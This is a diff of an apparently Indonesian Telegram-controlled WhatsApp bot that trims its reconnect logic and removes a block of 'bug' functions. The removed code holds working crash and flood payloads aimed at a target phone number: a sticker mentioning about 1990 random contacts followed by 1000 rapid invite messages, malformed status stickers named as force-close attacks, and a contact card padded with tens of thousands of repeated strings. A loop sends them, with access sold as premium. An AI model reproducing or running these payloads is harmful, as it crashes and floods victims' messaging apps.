@@ -26,7 +26,7 @@ const thumbnailUrl = "https://files.catbox.moe/6ogo26.jpg";
 
 // Konfigurasi GitHub Auto Update
 const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/primrose-bot/main/index.js";
-const CURRENT_VERSION = "3.0.47";
+const CURRENT_VERSION = "3.0.50";
 const AUTO_UPDATE_FILE = "./database/auto_update.json";
 const PENDING_UPDATE_FILE = "./database/pending_update.json";
 
@@ -429,101 +429,16 @@ function ensureFileExists(filePath, defaultData = []) {
 let sock;
 let reconnectAttempts = new Map();
 let pingIntervals = new Map();
-let reconnectTimeouts = new Map();
-let healthCheckInterval = null;
-
-// ================= HEALTH CHECK SYSTEM ================= //
-
-function startHealthCheck() {
-    if (healthCheckInterval) {
-        clearInterval(healthCheckInterval);
-    }
-    
-    healthCheckInterval = setInterval(async () => {
-        for (const [botNumber, sock] of sessions) {
-            try {
-                // Cek koneksi dengan ping ke socket
-                const isConnected = sock.user && sock.ws && sock.ws.readyState === 1;
-                
-                if (!isConnected) {
-                    console.log(chalk.yellow(`⚠️ Bot ${botNumber} appears disconnected, attempting reconnect...`));
-                    await handleReconnect(botNumber);
-                } else {
-                    // Test kirim ping kecil untuk memastikan koneksi benar-benar aktif
-                    try {
-                        await sock.sendPresenceUpdate('available');
-                    } catch (pingError) {
-                        console.log(chalk.yellow(`⚠️ Bot ${botNumber} ping failed, attempting reconnect...`));
-                        await handleReconnect(botNumber);
-                    }
-                }
-            } catch (error) {
-                console.error(chalk.red(`Health check error for ${botNumber}:`), error.message);
-                await handleReconnect(botNumber);
-            }
-        }
-    }, 60000); // Check setiap 1 menit
-    
-    console.log(chalk.green("✅ Health check system started"));
-}
-
-function stopHealthCheck() {
-    if (healthCheckInterval) {
-        clearInterval(healthCheckInterval);
-        healthCheckInterval = null;
-        console.log(chalk.yellow("⚠️ Health check system stopped"));
-    }
-}
-
-// ================= CONNECTION HANDLER ================= //
-
-function createStableSocket(state, saveCreds) {
-    return makeWASocket({
-        auth: state,
-        printQRInTerminal: false,
-        logger: P({ level: "silent" }),
-        defaultQueryTimeoutMs: 60000,
-        keepAliveIntervalMs: 30000,
-        connectTimeoutMs: 120000,
-        emitOwnEvents: true,
-        fireInitQueries: true,
-        syncFullHistory: false,
-        markOnlineOnConnect: false,
-        generateHighQualityLinkPreview: false,
-        retryRequestDelayMs: 2000,
-        maxMsgRetryCount: 5,
-        transactionOpts: { maxCommitRetries: 5, delayBetweenTriesMs: 2000 },
-        browser: ["PrimroseBot", "Chrome", "1.0.0"],
-        shouldIgnoreJid: () => false,
-        getMessage: async () => undefined,
-    });
-}
 
 function startPingInterval(botNumber, ws) {
-    stopPingInterval(botNumber);
-    
-    const interval = setInterval(async () => {
-        try {
-            if (ws && ws.user && ws.ws && ws.ws.readyState === 1) {
-                await ws.sendPresenceUpdate('available');
-            } else {
-                // Jika socket tidak ready, trigger reconnect
-                clearInterval(interval);
-                pingIntervals.delete(botNumber);
-                console.log(chalk.yellow(`⚠️ Ping interval detected dead socket for ${botNumber}`));
-                await handleReconnect(botNumber);
-            }
-        } catch (error) {
-            console.error(chalk.red(`Ping error for ${botNumber}:`), error.message);
-            // Jika error connection closed, trigger reconnect
-            if (error.message && (error.message.includes("Connection closed") || error.message.includes("timeout"))) {
-                clearInterval(interval);
-                pingIntervals.delete(botNumber);
-                await handleReconnect(botNumber);
-            }
+    if (pingIntervals.has(botNumber)) {
+        clearInterval(pingIntervals.get(botNumber));
+    }
+    const interval = setInterval(() => {
+        if (ws && ws.user) {
+            ws.sendMessage(botNumber + "@s.whatsapp.net", { text: " " }).catch(() => {});
         }
     }, 25000);
-    
     pingIntervals.set(botNumber, interval);
 }
 
@@ -534,163 +449,77 @@ function stopPingInterval(botNumber) {
     }
 }
 
-async function handleReconnect(botNumber) {
-    // Clear existing reconnect timeout
-    if (reconnectTimeouts.has(botNumber)) {
-        clearTimeout(reconnectTimeouts.get(botNumber));
-        reconnectTimeouts.delete(botNumber);
-    }
-    
-    try {
-        console.log(chalk.cyan(`🔄 Handling reconnect for ${botNumber}...`));
-        
-        // Cek apakah socket masih ada di sessions
-        const existingSock = sessions.get(botNumber);
-        if (existingSock) {
-            try {
-                await existingSock.end();
-            } catch (e) {
-                // Ignore
-            }
-            sessions.delete(botNumber);
-        }
-        
-        // Stop ping interval yang lama
-        stopPingInterval(botNumber);
-        
-        // Reset reconnect attempts
-        reconnectAttempts.delete(botNumber);
-        
-        // Reconnect
-        await connectWithRetry(botNumber);
-        
-    } catch (error) {
-        console.error(chalk.red(`Error handling reconnect for ${botNumber}:`), error.message);
-        
-        // Schedule retry
-        const retryDelay = 10000;
-        console.log(chalk.yellow(`⏳ Scheduling reconnect retry for ${botNumber} in ${retryDelay/1000}s`));
-        
-        const timeout = setTimeout(() => {
-            reconnectTimeouts.delete(botNumber);
-            handleReconnect(botNumber);
-        }, retryDelay);
-        
-        reconnectTimeouts.set(botNumber, timeout);
-    }
-}
-
-async function connectWithRetry(botNumber, attempt = 1) {
-    const maxAttempts = 5;
-    const baseDelay = 5000;
-    
-    try {
-        console.log(chalk.cyan(`🔄 Connecting ${botNumber} (attempt ${attempt}/${maxAttempts})...`));
-        
-        const sessionDir = createSessionDir(botNumber);
-        
-        if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
-            console.log(chalk.red(`❌ Creds.json not found for ${botNumber}, removing from active sessions`));
-            removeActiveSession(botNumber);
-            return null;
-        }
-        
-        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-        const sock = createStableSocket(state, saveCreds);
-        
-        await new Promise((resolve, reject) => {
-            const timeout = setTimeout(() => {
-                reject(new Error("Connection timeout"));
-            }, 120000);
-            
-            sock.ev.on("connection.update", async (update) => {
-                const { connection, lastDisconnect, qr } = update;
-                
-                if (connection === "open") {
-                    clearTimeout(timeout);
-                    console.log(chalk.green(`✅ Bot ${botNumber} terhubung!`));
-                    sessions.set(botNumber, sock);
-                    reconnectAttempts.delete(botNumber);
-                    startPingInterval(botNumber, sock);
-                    
-                    // Setup error handler untuk socket
-                    sock.ev.on("error", (error) => {
-                        console.error(chalk.red(`Socket error for ${botNumber}:`), error.message);
-                        if (error.message && (error.message.includes("Connection closed") || error.message.includes("timeout"))) {
-                            handleReconnect(botNumber);
-                        }
-                    });
-                    
-                    resolve(sock);
-                    
-                } else if (connection === "close") {
-                    clearTimeout(timeout);
-                    const statusCode = lastDisconnect?.error?.output?.statusCode;
-                    const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
-                    
-                    if (shouldReconnect) {
-                        console.log(chalk.yellow(`⚠️ Bot ${botNumber} disconnected (${statusCode || 'unknown'})`));
-                        
-                        // Schedule reconnect dengan backoff
-                        const currentAttempt = (reconnectAttempts.get(botNumber) || 0) + 1;
-                        reconnectAttempts.set(botNumber, currentAttempt);
-                        
-                        const delay = Math.min(baseDelay * Math.pow(1.5, currentAttempt - 1), 60000);
-                        console.log(chalk.yellow(`⏳ Reconnecting ${botNumber} in ${delay/1000}s (attempt ${currentAttempt})`));
-                        
-                        const timeout = setTimeout(() => {
-                            reconnectTimeouts.delete(botNumber);
-                            handleReconnect(botNumber);
-                        }, delay);
-                        
-                        reconnectTimeouts.set(botNumber, timeout);
-                    } else {
-                        console.log(chalk.red(`🚫 Bot ${botNumber} logged out, removing session`));
-                        removeActiveSession(botNumber);
-                        stopPingInterval(botNumber);
-                    }
-                    resolve(null);
-                    
-                } else if (connection === "connecting") {
-                    console.log(chalk.blue(`🔄 Bot ${botNumber} connecting...`));
-                }
-            });
-            
-            sock.ev.on("creds.update", saveCreds);
-        });
-        
-        return sock;
-        
-    } catch (error) {
-        console.error(chalk.red(`Error connecting ${botNumber} (attempt ${attempt}):`), error.message);
-        
-        if (attempt < maxAttempts) {
-            const delay = Math.min(baseDelay * Math.pow(1.5, attempt), 30000);
-            console.log(chalk.yellow(`⏳ Retrying ${botNumber} in ${delay/1000}s...`));
-            await sleep(delay);
-            return connectWithRetry(botNumber, attempt + 1);
-        } else {
-            console.error(chalk.red(`❌ Failed to connect ${botNumber} after ${maxAttempts} attempts`));
-            
-            // Schedule retry after longer delay
-            const timeout = setTimeout(() => {
-                reconnectTimeouts.delete(botNumber);
-                connectWithRetry(botNumber, 1);
-            }, 60000);
-            
-            reconnectTimeouts.set(botNumber, timeout);
-            
-            return null;
-        }
-    }
-}
-
 async function reconnectWithBackoff(botNumber, attempt = 1) {
-    await handleReconnect(botNumber);
+    const maxAttempts = 10;
+    const baseDelay = 5000;
+    const maxDelay = 60000;
+    let delay = Math.min(baseDelay * Math.pow(1.5, attempt - 1), maxDelay);
+    console.log(`🔄 Reconnect attempt ${attempt} for ${botNumber} in ${delay}ms`);
+    setTimeout(async () => {
+        try {
+            await reconnectWhatsApp(botNumber, attempt);
+        } catch (error) {
+            if (attempt < maxAttempts) {
+                await reconnectWithBackoff(botNumber, attempt + 1);
+            } else {
+                console.error(`❌ Failed to reconnect ${botNumber} after ${maxAttempts} attempts`);
+            }
+        }
+    }, delay);
 }
 
 async function reconnectWhatsApp(botNumber, attempt = 1) {
-    return await connectWithRetry(botNumber, attempt);
+    try {
+        console.log(`🔄 Reconnecting WhatsApp ${botNumber} (attempt ${attempt})...`);
+        const sessionDir = createSessionDir(botNumber);
+        if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
+            console.log(`❌ Creds.json not found for ${botNumber}, removing from active sessions`);
+            removeActiveSession(botNumber);
+            return null;
+        }
+        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+        const newSock = makeWASocket({
+            auth: state,
+            printQRInTerminal: false,
+            logger: P({ level: "silent" }),
+            defaultQueryTimeoutMs: undefined,
+            keepAliveIntervalMs: 60000,
+            connectTimeoutMs: 60000,
+            emitOwnEvents: true,
+            fireInitQueries: true,
+            syncFullHistory: false,
+            markOnlineOnConnect: false,
+            generateHighQualityLinkPreview: false,
+        });
+        stopPingInterval(botNumber);
+        newSock.ev.on("connection.update", async (update) => {
+            const { connection, lastDisconnect } = update;
+            if (connection === "open") {
+                console.log(`✅ WhatsApp ${botNumber} reconnect success!`);
+                sessions.set(botNumber, newSock);
+                reconnectAttempts.delete(botNumber);
+                startPingInterval(botNumber, newSock);
+            } else if (connection === "close") {
+                const statusCode = lastDisconnect?.error?.output?.statusCode;
+                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
+                if (shouldReconnect) {
+                    const currentAttempt = (reconnectAttempts.get(botNumber) || 1) + 1;
+                    reconnectAttempts.set(botNumber, currentAttempt);
+                    console.log(`⚠️ WhatsApp ${botNumber} disconnected (${statusCode}), reconnecting...`);
+                    await reconnectWithBackoff(botNumber, currentAttempt);
+                } else {
+                    console.log(`🚫 WhatsApp ${botNumber} logged out, removing session`);
+                    removeActiveSession(botNumber);
+                    stopPingInterval(botNumber);
+                }
+            }
+        });
+        newSock.ev.on("creds.update", saveCreds);
+        return newSock;
+    } catch (error) {
+        console.error(`Error reconnecting WhatsApp ${botNumber}:`, error);
+        throw error;
+    }
 }
 
 function saveActiveSessions(botNumber) {
@@ -721,12 +550,6 @@ function removeActiveSession(botNumber) {
         }
         sessions.delete(botNumber);
         stopPingInterval(botNumber);
-        
-        // Clear reconnect timeout
-        if (reconnectTimeouts.has(botNumber)) {
-            clearTimeout(reconnectTimeouts.get(botNumber));
-            reconnectTimeouts.delete(botNumber);
-        }
     } catch (error) {
         console.error("Error removing active session:", error);
     }
@@ -736,20 +559,50 @@ async function initializeWhatsAppConnections() {
     try {
         if (fs.existsSync(SESSIONS_FILE)) {
             const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-            console.log(chalk.cyan(`📱 Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));
-            
+            console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
             for (const botNumber of activeNumbers) {
-                console.log(chalk.cyan(`🔄 Mencoba menghubungkan WhatsApp: ${botNumber}`));
-                await connectWithRetry(botNumber);
-                await sleep(2000); // Delay antar koneksi
+                console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
+                const sessionDir = createSessionDir(botNumber);
+                const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+                sock = makeWASocket({
+                    auth: state,
+                    printQRInTerminal: true,
+                    logger: P({ level: "silent" }),
+                    defaultQueryTimeoutMs: undefined,
+                    keepAliveIntervalMs: 60000,
+                    connectTimeoutMs: 60000,
+                    emitOwnEvents: true,
+                    fireInitQueries: true,
+                    syncFullHistory: false,
+                    markOnlineOnConnect: false,
+                    generateHighQualityLinkPreview: false,
+                });
+                await new Promise((resolve, reject) => {
+                    sock.ev.on("connection.update", async (update) => {
+                        const { connection, lastDisconnect } = update;
+                        if (connection === "open") {
+                            console.log(`Bot ${botNumber} terhubung!`);
+                            sessions.set(botNumber, sock);
+                            startPingInterval(botNumber, sock);
+                            resolve();
+                        } else if (connection === "close") {
+                            const statusCode = lastDisconnect?.error?.output?.statusCode;
+                            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
+                            if (shouldReconnect) {
+                                console.log(`Mencoba menghubungkan ulang bot ${botNumber}... (${statusCode || 'unknown'})`);
+                                reconnectWithBackoff(botNumber, 1);
+                                resolve();
+                            } else {
+                                reject(new Error("Koneksi ditutup - logged out"));
+                            }
+                        }
+                    });
+                    sock.ev.on("creds.update", saveCreds);
+                });
             }
         }
-        
-        // Start health check setelah semua koneksi dicoba
-        startHealthCheck();
-        
     } catch (error) {
-        console.error(chalk.red("Error initializing WhatsApp Connections:"), error);
+        console.error("Error initializing WhatsApp Connections:", error);
     }
 }
 
@@ -775,7 +628,19 @@ async function ConnectToWhatsApp(botNumber, chatId) {
     const sessionDir = createSessionDir(botNumber);
     const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
 
-    sock = createStableSocket(state, saveCreds);
+    sock = makeWASocket({
+        auth: state,
+        printQRInTerminal: false,
+        logger: P({ level: "silent" }),
+        defaultQueryTimeoutMs: undefined,
+        keepAliveIntervalMs: 60000,
+        connectTimeoutMs: 60000,
+        emitOwnEvents: true,
+        fireInitQueries: true,
+        syncFullHistory: false,
+        markOnlineOnConnect: false,
+        generateHighQualityLinkPreview: false,
+    });
 
     sock.ev.on("connection.update", async (update) => {
         const { connection, lastDisconnect } = update;
@@ -801,24 +666,11 @@ async function ConnectToWhatsApp(botNumber, chatId) {
                 try {
                     fs.rmSync(sessionDir, { recursive: true, force: true });
                 } catch (error) {}
-            } else {
-                // Auto reconnect untuk status code lainnya
-                console.log(chalk.yellow(`⚠️ Connection closed for ${botNumber}, auto reconnect triggered`));
-                await handleReconnect(botNumber);
             }
         } else if (connection === "open") {
             sessions.set(botNumber, sock);
             saveActiveSessions(botNumber);
             startPingInterval(botNumber, sock);
-            
-            // Setup error handler
-            sock.ev.on("error", (error) => {
-                console.error(chalk.red(`Socket error for ${botNumber}:`), error.message);
-                if (error.message && (error.message.includes("Connection closed") || error.message.includes("timeout"))) {
-                    handleReconnect(botNumber);
-                }
-            });
-            
             if (statusMessage) {
                 await safeEditMessageText(chatId, statusMessage, `
 <blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
@@ -856,108 +708,6 @@ async function ConnectToWhatsApp(botNumber, chatId) {
 
     sock.ev.on("creds.update", saveCreds);
     return sock;
-}
-
-// ================= SAFE BUG SENDER ================= //
-
-async function getActiveSocket() {
-    // Cari socket yang aktif
-    for (const [botNumber, sock] of sessions) {
-        try {
-            if (sock && sock.user && sock.ws && sock.ws.readyState === 1) {
-                // Test koneksi
-                await sock.sendPresenceUpdate('available');
-                return { sock, botNumber };
-            }
-        } catch (error) {
-            console.log(chalk.yellow(`⚠️ Socket ${botNumber} test failed, skipping...`));
-            // Trigger reconnect untuk socket yang mati
-            handleReconnect(botNumber);
-        }
-    }
-    return null;
-}
-
-async function safeBugSender(chatId, targetNumber, bugType, bugFunction, iterations = 1, delay = 100) {
-    const target = `${targetNumber}@s.whatsapp.net`;
-    const date = getCurrentDate();
-    
-    if (sessions.size === 0) {
-        await safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-        return false;
-    }
-    
-    // Cek dan pilih socket yang aktif
-    const activeSocket = await getActiveSocket();
-    
-    if (!activeSocket) {
-        await safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif. Mencoba reconnect...");
-        // Trigger reconnect untuk semua session
-        for (const [botNumber] of sessions) {
-            handleReconnect(botNumber);
-        }
-        await safeSendMessage(chatId, "🔄 Sistem sedang melakukan reconnect, silakan coba lagi dalam 30 detik.");
-        return false;
-    }
-    
-    let { sock, botNumber } = activeSocket;
-    
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, bugType, date), { 
-        parse_mode: "HTML", 
-        reply_markup: createCheckButton(targetNumber) 
-    });
-    
-    let successCount = 0;
-    let failCount = 0;
-    
-    for (let i = 0; i < iterations; i++) {
-        try {
-            // Cek ulang koneksi sebelum kirim
-            if (!sock.ws || sock.ws.readyState !== 1) {
-                console.log(chalk.yellow(`⚠️ Socket ${botNumber} disconnected during bug sending, mencari socket lain...`));
-                
-                const newActive = await getActiveSocket();
-                if (newActive) {
-                    sock = newActive.sock;
-                    botNumber = newActive.botNumber;
-                } else {
-                    throw new Error("No active socket available");
-                }
-            }
-            
-            await bugFunction(sock, target);
-            successCount++;
-            console.log(chalk.green(`✅ ${bugType} iteration ${i + 1}/${iterations} to ${targetNumber} (sender: ${botNumber})`));
-            
-        } catch (error) {
-            failCount++;
-            console.error(chalk.red(`❌ ${bugType} iteration ${i + 1} failed:`), error.message);
-            
-            // Jika error karena connection closed, cari socket lain
-            if (error.message && (error.message.includes("Connection closed") || error.message.includes("timeout"))) {
-                console.log(chalk.yellow(`🔄 Connection error, mencari socket alternatif...`));
-                
-                // Trigger reconnect untuk socket yang error
-                handleReconnect(botNumber);
-                
-                const newActive = await getActiveSocket();
-                if (newActive) {
-                    sock = newActive.sock;
-                    botNumber = newActive.botNumber;
-                    console.log(chalk.green(`✅ Berpindah ke socket ${botNumber}`));
-                }
-            }
-        }
-        
-        if (i < iterations - 1) {
-            await sleep(delay);
-        }
-    }
-    
-    // Kirim report
-    await safeSendMessage(chatId, `📊 *${bugType} Report*\n\n✅ Success: ${successCount}\n❌ Failed: ${failCount}\n📱 Target: ${targetNumber}\n🤖 Sender: ${botNumber}`, { parse_mode: "Markdown" });
-    
-    return successCount > 0;
 }
 
 let premiumUsers = [];
@@ -1118,7 +868,7 @@ async function sendColoredMenu(chatId, from, color, editMessageId = null) {
 🎩 Pemilik : @ItsMeXanderRzMd 🌟    
 😄 Owner : @realmarz 🌟
 🍽 Version : ${CURRENT_VERSION} 
-🗡 Platform : Telegram Tes
+🗡 Platform : Telegram
 <blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>
 ⛧ Status : ${status}
 ⛧ Number : ${botNumber}
@@ -1452,165 +1202,6 @@ async function executeTestFunction(sock, target, funcCode, jumlah) {
     }
 }
 
-// ================= BUG FUNCTIONS ================= //
-
-async function CrashFrHome(sock, target) {
-    try {
-        const stickerMsg = {
-            viewOnceMessage: {
-                message: {
-                    stickerMessage: {
-                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
-                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-                        mimetype: "image/webp",
-                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
-                        fileLength: { low: 1, high: 0, unsigned: true },
-                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
-                        isAnimated: true,
-                        contextInfo: {
-                            mentionedJid: [target, ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")],
-                        },
-                    },
-                },
-            },
-        };
-        await sock.sendMessage(target, stickerMsg);
-        console.log("✅ CrashFrHome sticker sent to:", target);
-        for (let i = 0; i < 1000; i++) {
-            await sock.sendMessage(target, {
-                viewOnceMessage: {
-                    message: {
-                        eventMessage: {
-                            newsletterAdminInviteMessage: {
-                                newsletterJid: "33333333333333333@newsletter",
-                                newsletterName: "FrezeHomeAbouse",
-                            },
-                        },
-                    },
-                },
-            });
-            console.log(`📤 CrashFrHome sending to ${target} - iteration ${i + 1}`);
-            await sleep(50);
-        }
-    } catch (e) {
-        console.log("❌ Error in CrashFrHome:", e);
-        throw e;
-    }
-}
-
-async function StickerFC(sock, target) {
-    try {
-        const message = {
-            "groupStatusMessageV2": {
-                "message": {
-                    "stickerMessage": {
-                        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                        "mimetype": "image/webp",
-                        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                        "fileLength": "10610",
-                        "mediaKeyTimestamp": "1775044724",
-                        "stickerSentTs": "1775044724091"
-                    }
-                }
-            }
-        };
-        await sock.relayMessage(target, message, {});
-        console.log("✅ StickerFC sent to:", target);
-    } catch (err) {
-        console.error("❌ Error StickerFC:", err);
-        throw err;
-    }
-}
-
-async function Zxxcontact(sock, target) {
-    try {
-        const contactMessage = {
-            viewOnceMessage: {
-                message: {
-                    contactMessage: {
-                        displayName: "카나이 하티".repeat(20000),
-                        vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + "카나이 하티".repeat(10000) + "\nORG:" + "아르케인 엑소시스트".repeat(10000) + "\nADR;TYPE=WORK:;;" + "서울특별시 강남구 테헤란로 101".repeat(10000) + ";;;\nTEL;type=CELL;waid=821012345678:" + "+821012345678".repeat(10000) + "\nNOTE:" + "관리자 전용 계정입니다.".repeat(20000) + "\nEND:VCARD"
-                    }
-                }
-            }
-        };
-        await sock.relayMessage(target, contactMessage, { participant: { jid: target } });
-        console.log("✅ Zxxcontact sent to:", target);
-    } catch (err) {
-        console.error("❌ Error Zxxcontact:", err);
-        throw err;
-    }
-}
-
-async function FCinvisTes(sock, target) {
-    const message = {
-        "groupStatusMessageV2": {
-            "message": {
-                "stickerMessage": {
-                    "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                    "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                    "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                    "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                    "mimetype": "image/webp",
-                    "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                    "fileLength": "10610",
-                    "mediaKeyTimestamp": "1775044724",
-                    "stickerSentTs": "1775044724091"
-                }
-            }
-        }
-    };
-    return await sock.relayMessage(target, message, { participant: { jid: target } });
-}
-
-async function FCinvis(sock, target) {
-    return await FCinvisTes(sock, target);
-}
-
-async function brem(sock, target) { }
-async function VisiFriend(sock, target) { }
-async function OfferXForclose(sock, target) { }
-async function bulldozerV2(sock, target) { }
-async function xatanicaldelayv2(sock, target) { }
-async function MbaPe(sock, target) { }
-
-function createBugSuccessMessage(targetNumber, bugType, date) {
-    return `
-<blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>
-
-◉ Target : ${targetNumber}
-◉ Type Bug : ${bugType}
-◉ Status : Successfully Send
-◉ Date Now : ${date}
-
-<blockquote>⸙ Spam Free at will</blockquote>`;
-}
-
-function createCheckButton(targetNumber) {
-    return { inline_keyboard: [[{ text: "📱 CEK TARGET", url: `https://wa.me/${targetNumber}` }]] };
-}
-
-function getCurrentDate() {
-    return new Date().toLocaleString('id-ID', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
-}
-
-async function checkUserAccess(userId, chatId, chatType, commandName) {
-    const isOwnerUser = isOwner(userId);
-    const isPremiumUser = isPremium(userId);
-    if (isCommandBlocked(commandName)) return false;
-    if (isOwnerUser) return true;
-    if (chatType === "private" && !isPremiumUser) {
-        await safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
-        return false;
-    }
-    return true;
-}
-
 bot.onText(/\/cekfunc/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -1810,11 +1401,7 @@ bot.onText(/\/testfunction(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
     if (sessions.size === 0) {
         return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
     }
-    const activeSocket = await getActiveSocket();
-    if (!activeSocket) {
-        return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif.");
-    }
-    const sock = activeSocket.sock;
+    const sock = sessions.values().next().value;
     const funcCode = msg.reply_to_message.text;
     const loadingMsg = await safeSendMessage(chatId, "🚀 *Memproses testfunction...*", { parse_mode: "Markdown" });
     if (!loadingMsg) return;
@@ -1931,60 +1518,30 @@ bot.onText(/\/listadmin/, async (msg) => {
 });
 
 bot.on("poll_answer", async (answer) => {
-    // Handle premium poll
     const pollData = pendingPremiumPoll[answer.poll_id];
-    if (pollData) {
-        if (answer.user.id !== pollData.adminId) return;
-        const choice = answer.option_ids[0];
-        let days;
-        if (choice === 0) days = 7;
-        if (choice === 1) days = 14;
-        if (choice === 2) days = 30;
-        if (choice === 3) days = "permanent";
-        let expiresAt;
-        if (days === "permanent") {
-            expiresAt = "permanent";
-        } else {
-            expiresAt = Date.now() + days * 86400000;
-        }
-        const existing = premiumUsers.find(u => u.id === pollData.userId);
-        if (!existing) {
-            premiumUsers.push({ id: pollData.userId, expiresAt });
-        } else {
-            existing.expiresAt = expiresAt;
-        }
-        savePremiumUsers();
-        safeSendMessage(pollData.chatId, `✅ Premium berhasil ditambahkan\n\n👤 User ID: ${pollData.userId}\n⏳ Durasi: ${days === "permanent" ? "Permanent" : days + " Hari"}`);
-        delete pendingPremiumPoll[answer.poll_id];
-        return;
+    if (!pollData) return;
+    if (answer.user.id !== pollData.adminId) return;
+    const choice = answer.option_ids[0];
+    let days;
+    if (choice === 0) days = 7;
+    if (choice === 1) days = 14;
+    if (choice === 2) days = 30;
+    if (choice === 3) days = "permanent";
+    let expiresAt;
+    if (days === "permanent") {
+        expiresAt = "permanent";
+    } else {
+        expiresAt = Date.now() + days * 86400000;
     }
-    
-    // Handle color poll
-    const colorPollData = pendingColorPoll[answer.poll_id];
-    if (colorPollData) {
-        const selectedOption = answer.option_ids[0];
-        let selectedColor = "";
-        if (selectedOption === 0) selectedColor = "XRED";
-        else if (selectedOption === 1) selectedColor = "XBLUE";
-        else if (selectedOption === 2) selectedColor = "XGREEN";
-        else if (selectedOption === 3) selectedColor = "XWHITE";
-        else if (selectedOption === 4) selectedColor = "XDISCO";
-        const colorValue = getColorFromChoice(selectedColor);
-        saveColorSetting(colorValue);
-        currentColor = colorValue;
-        if (buttonIntervals.has(colorPollData.currentMessageId)) {
-            clearInterval(buttonIntervals.get(colorPollData.currentMessageId));
-            buttonIntervals.delete(colorPollData.currentMessageId);
-        }
-        if (globalIntervalId) {
-            clearInterval(globalIntervalId);
-            globalIntervalId = null;
-        }
-        discoActive = false;
-        await sendColoredMenu(colorPollData.chatId, colorPollData.from, colorValue, colorPollData.currentMessageId);
-        delete pendingColorPoll[answer.poll_id];
-        return;
+    const existing = premiumUsers.find(u => u.id === pollData.userId);
+    if (!existing) {
